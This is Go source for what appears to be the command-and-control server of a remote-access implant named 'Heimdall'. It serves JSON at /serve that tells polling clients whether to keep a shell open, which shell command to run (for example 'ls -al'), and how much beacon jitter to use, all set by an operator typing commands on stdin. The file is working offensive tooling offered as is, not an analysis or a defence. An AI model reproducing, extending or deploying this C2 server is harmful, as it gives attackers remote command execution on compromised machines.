package main

import (
	"bufio"
	"github.com/fatih/color"
	"github.com/gin-gonic/gin"
	"net/http"
	"os"
	"strconv"
	"strings"
)

type Heimdall struct {
	KeepShellConnection bool
	ExecuteCommand      string
	Jitter              int64
}

var heimdall = Heimdall{false, "", 2}

func main() {
	go processOdinCommands()

	g := gin.Default()
	g.GET("/serve", respondHeimdall)
	err := g.Run(":8080")
	if err != nil {
		panic(err)
	}
}

func respondHeimdall(context *gin.Context) {
	context.JSON(http.StatusOK, heimdall)
}

func processOdinCommands() {
	color.Red("Provide commands to Heimdall:")
	color.Red("1. k=true|false - Open/Close shell connection")
	color.Red("2. e=ls -al - Set command to execute")
	color.Red("3. j=10 - Set jitter in seconds")

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		input := scanner.Text()
		if strings.Contains(input, "k=") {
			heimdall.KeepShellConnection, _ = strconv.ParseBool(strings.Replace(input, "k=", "", 1))
			color.Green("KeepShellConnection set to %t", heimdall.KeepShellConnection)
		} else if strings.Contains(input, "e=") {
			cmd := strings.ReplaceAll(strings.Replace(strings.Replace(input, "e=", "", 1), " ", "||", 1), " ", ";")
			heimdall.ExecuteCommand = cmd
			color.Green("Command set to %s", cmd)
		} else if strings.Contains(input, "j=") {
			heimdall.Jitter, _ = strconv.ParseInt(strings.Split(input, "j=")[1], 10, 64)
			color.Green("Jitter set to %d", heimdall.Jitter)
		} else {
			color.Red("Invalid command. Use k=, e=, or j=")
		}
	}
}
